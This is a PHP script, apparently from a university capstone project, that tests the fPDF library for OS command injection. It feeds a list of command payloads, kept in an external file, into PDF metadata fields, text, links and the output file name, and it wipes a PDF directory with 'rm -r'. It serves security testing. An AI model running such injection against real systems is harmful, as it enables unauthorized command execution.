<!-- File: os.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (OS Command Injection) for fPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';
use Fpdf\Fpdf;

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
    $pdf = new FPDF();
    // Required to set a Font
    $pdf->SetFont('Arial','B',16);
    $pdf->SetCompression(false);

    $pdf->AddPage();
	return $pdf;
}


function check_test_file(string $endpoint, string $command) {
    if (file_exists('/var/www/myapp/test')) {
        echo "Endpoint: ".$endpoint."\nCommand: ".$command."<br/><br/>";
    }
}

// Creator
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetCreator($command);
    $pdf->Output('F', '/var/www/myapp/pdfs/creator'.$i.'.pdf');
    check_test_file("Creator", $command);
    $i++;
}

// Title
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetTitle($command);
    $pdf->Output('F', '/var/www/myapp/pdfs/title'.$i.'.pdf');
    check_test_file("Title", $command);
    $i++;
}

// Author
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetAuthor($command);
    $pdf->Output('F', '/var/www/myapp/pdfs/author'.$i.'.pdf');
    check_test_file("Author", $command);
    $i++;
}

// Subject
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetSubject($command);
    $pdf->Output('F', '/var/www/myapp/pdfs/subject'.$i.'.pdf');
    check_test_file("Subject", $command);
    $i++;
}

// Keywords
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->SetKeywords($command);
    $pdf->Output('F', '/var/www/myapp/pdfs/keywords'.$i.'.pdf');
    check_test_file("Keywords", $command);
    $i++;
}

// Link
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Link(35, 35, 10, 10, $command);
    $pdf->Output('F', '/var/www/myapp/pdfs/link'.$i.'.pdf');
    check_test_file("Link", $command);
    $i++;
}

// Text
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Text(50, 50, $command);
    $pdf->Output('F', '/var/www/myapp/pdfs/text'.$i.'.pdf');
    check_test_file("Text", $command);
    $i++;
}

// Write
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Write(120, $command, $command);
    $pdf->Output('F', '/var/www/myapp/pdfs/write'.$i.'.pdf');
    check_test_file("Write", $command);
    $i++;
}
// Cell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Cell(40, 10, $command);
    $pdf->Output('F', '/var/www/myapp/pdfs/cell'.$i.'.pdf');
    check_test_file("Cell", $command);
    $i++;
}

// MultiCell
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->MultiCell(20, 20, $command);
    $pdf->Output('F', '/var/www/myapp/pdfs/multicell'.$i.'.pdf');
    check_test_file("MultiCell", $command);
    $i++;
}

// Image Links
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Image("/var/www/myapp/images/xref.jpg", 60, 30, 90, 0, 'JPG', $command);
    $pdf->Output('F', '/var/www/myapp/pdfs/linkimage'.$i.'.pdf');
    check_test_file("ImageLink", $command);
    $i++;
}

// Output
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $pdf->Output('F', '/var/www/myapp/pdfs/output'.$command);
    check_test_file("Output", $command);
    $i++;
}

?>
<h1 style="text-align:center;">Operating System Command Injection Complete!</h1>